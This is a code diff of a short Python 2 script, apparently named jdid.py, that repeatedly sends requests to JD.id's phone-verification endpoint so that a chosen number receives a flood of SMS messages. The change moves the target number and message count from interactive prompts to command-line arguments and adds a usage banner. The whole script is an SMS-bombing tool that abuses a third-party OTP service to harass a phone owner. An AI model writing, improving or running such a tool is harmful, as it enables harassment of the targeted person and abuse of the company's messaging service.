@@ -30,20 +30,28 @@ tes= """
       `--{__________)        \/
 """
 def spam():
-        print tes
-	phone_number = raw_input("Nomer HP : ")
-	countx = raw_input("Jumlah : ")
-	countx = int(countx)
-	param = {'phone':''+phone_number,'smsType':'1'}
+	jumlah=sys.argv[1].split("=")[1:]
+	jumlah=jumlah[0]
+	jumlah=int(jumlah)
+	phone=sys.argv[2]
+	print __banner__
+	param = {'phone':''+sys.argv[2],'smsType':'1'}
 	count = 0
-	while (count < countx):
+	while (count < jumlah):
 		r = requests.post('http://sc.jd.id/phone/sendPhoneSms', data=param)
 		if '"success":true' in r.text:
-			print("Terkirim^^")
+			print("Terkirim :D")
 		else:
-			print("Gagal Mengirim :( ")
+			print("Gagal Mengirim :(")
 		time.sleep(1)
 		count = count + 1
-	print("Succesful!!")
-	sys.exit(0)
-	spam()
+	print("Successful^-^")
+	sys.exit(1)
+
+if __name__ == '__main__':
+	if len(sys.argv) != 3:
+		print __banner__
+		print "Usage: jdid.py --count=10 PHONE"
+		sys.exit(0)
+	else:
+		spam()
